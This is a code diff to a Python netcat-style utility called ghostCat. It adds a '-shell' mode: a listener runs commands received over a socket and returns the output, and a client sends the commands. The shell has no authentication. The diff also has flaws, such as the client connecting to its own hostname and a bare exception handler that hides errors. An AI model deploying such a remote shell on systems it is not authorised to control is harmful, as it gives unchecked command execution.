@@ -6,11 +6,6 @@ import threading
 import sys
 import argparse
 
-#1-> connection sent/get messages |x|
-#2-> sent/get files |x|
-#3-> shell!  <<<<<!
-#4-> verbose mode maybe [x]
-#5-> Error Handle [x]
 
 class Server():
     def __init__(self,ip,port,v=0,file=None):
@@ -104,6 +99,33 @@ class Server():
         self.c.shutdown(socket.SHUT_RDWR)
         self.c.close()
 
+    def reverse_shell(self):
+        while(1):
+            cmd = self.c.recv(1024).decode()
+
+            if cmd == "!quit":
+                self.c.shutdown(socket.SHUT_RDWR)
+                self.c.close()
+                break
+
+            elif cmd [:2] == "cd":
+                try:
+                    os.chdir(cmd[3:])
+                    m = "[+] Directory Changed To " + cmd[3:]
+                except Exception as e:
+                    m = "[-] Error"
+                self.c.send(m.encode())
+                
+            else:
+                try:
+                    output = subprocess.getoutput(cmd)
+                except Exception as e:
+                    output = e
+                if len(output) == 0:
+                    output = "     "
+                self.c.send(output.encode())
+         
+
 class Client():
     def __init__(self,ip,port,v=0,file=None):
         self.ip = ip
@@ -176,6 +198,7 @@ class Client():
     def receive_file(self):
         data = b""
         size = 1024
+        self.s.settimeout(2)
         try:
             f = open(self.file,"wb")
             self.verbose(f"[+] Successfully Opened {self.file}...")            
@@ -199,7 +222,10 @@ class Client():
             self.verbose(f"[+] File Size: {float(size/1000)}KB")
             data+= byts
             size+= size
-            byts = self.s.recv(size)
+            try:
+                byts = self.s.recv(size)
+            except TimeoutError:
+                        break
              
         f.write(data)
         self.verbose(f"[+] Successfully Received {self.file}...")
@@ -207,16 +233,35 @@ class Client():
         self.s.shutdown(socket.SHUT_RDWR)
         self.s.close()
                 
-
-
+    def remote_shell(self):
+        while(1):
+            cmd = input("$>")
+            
+            if cmd == "!quit":
+                self.s.send(cmd.encode())
+                self.s.close()
+                break
+            else:
+                self.s.send(cmd.encode())
+                self.s.settimeout(0.5)
+                output = self.s.recv(1024) 
+                while(len(output)):
+                    print(output.decode())
+                    try:
+                        output = self.s.recv(1024)
+                    except TimeoutError:
+                        break
+                    
 def main():
-    parser = argparse.ArgumentParser(description='NetWork')
+    parser = argparse.ArgumentParser(description='A General NetWork Utility')
     parser.add_argument("-t",help="Target IP",metavar="",dest="t")
-    parser.add_argument("-p",type=int,help="Port",metavar="",dest="port")
+    parser.add_argument("-p",type=int,help="Port Number",metavar="",dest="port")
     parser.add_argument("-l",help="Listen For Connection",dest="listen",action='store_true')
     parser.add_argument("-v",help="Enable Verbose Mode",dest="v",action='store_true')
-    parser.add_argument("-uf",help="Upload A File, -uf=path/file.to.send",dest="uf")
-    parser.add_argument("-rf",help="Receive A File, -rf=path/file.to.save",dest="rf")
+    parser.add_argument("-uf",help="Upload A File,  ex: -uf=path/file.to.send",dest="uf")
+    parser.add_argument("-rf",help="Receive A File, ex: -rf=path/file.to.save",dest="rf")
+    parser.add_argument("-shell",help="Reverse Sh3ll, ex: ./ghostCat.py -lp [port] -shell ",dest="shell",action='store_true')
+
     args = parser.parse_args()
 
     if len(sys.argv) == 1:
@@ -224,12 +269,12 @@ def main():
         sys.exit(0)
 
     else:
-        if args.t and args.port and not args.rf and not args.uf:
+        if args.t and args.port and not args.rf and not args.uf and not args.shell:
             x = Client(socket.gethostbyname(args.t),args.port,args.v)
             x.peer_msg()
 
 
-        elif args.listen and args.port and not args.uf and not args.rf:
+        elif args.listen and args.port and not args.uf and not args.rf and not args.shell:
             x = Server(socket.gethostbyname(socket.gethostname()),args.port,args.v)
             x.peer_msg()
         
@@ -240,6 +285,15 @@ def main():
         elif args.rf:
             x = Client(socket.gethostbyname(args.t),args.port,args.v,args.rf)
             x.receive_file() 
+
+        elif args.listen and args.port and args.shell:
+            x = Server(socket.gethostbyname(socket.gethostname()),args.port,args.v)
+            x.reverse_shell()
+
+        elif args.t and args.port and args.shell:
+            x = Client(socket.gethostbyname(socket.gethostname()),args.port,args.v)
+            x.remote_shell()           
+            
         else:
             parser.print_help(sys.stderr)
                          
@@ -248,6 +302,8 @@ try:
 except KeyboardInterrupt:
     sys.exit(0)
 except TypeError:
-     print("usage: ghostCat [-h] [-t] [-p] [-l] [-v] [-uf UF] [-rf RF]")
+    print("usage: ghostCat [-h] [-t] [-p] [-l] [-v] [-uf UF] [-rf RF]")
+except:
+    pass
     
     
